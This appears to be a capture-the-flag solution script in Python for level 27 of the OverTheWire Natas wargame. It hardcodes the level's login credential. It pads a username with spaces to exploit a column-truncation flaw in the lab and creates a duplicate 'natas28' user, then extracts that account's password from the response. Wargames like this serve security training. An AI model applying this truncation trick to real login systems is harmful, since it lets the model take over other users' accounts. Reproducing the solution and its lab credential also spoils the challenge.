import requests as req

url = "http://natas27.natas.labs.overthewire.org/index.php"
payload = "natas28" + " " * 64 + "smile"
login = "natas27"
passwd = "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"

if __name__ == "__main__":
    r = req.post(url=url, data={"username": payload, "password": "passwd"}, auth=(login, passwd))
    r = req.post(url=url, data={"username": "natas28", "password": "passwd"}, auth=(login, passwd))
    i1 = r.text.index("[password] =&gt; ")+len("[password] =&gt; ")
    print(r.text[i1:].split("\n")[0])
